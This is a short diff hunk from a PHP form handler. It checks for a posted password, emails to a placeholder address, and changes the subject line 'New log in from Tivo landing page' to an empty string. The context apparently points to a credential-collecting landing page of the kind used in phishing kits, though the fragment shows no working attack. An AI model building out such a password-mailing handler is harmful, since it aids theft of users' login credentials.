@@ -14,7 +14,7 @@ if (empty($_POST["password"])) {
 }
 
 $EmailTo = "yourname@domain.com";
-$Subject = "New log in from Tivo landing page";
+$Subject = "";
 
 // prepare email body text
 $Body = "";
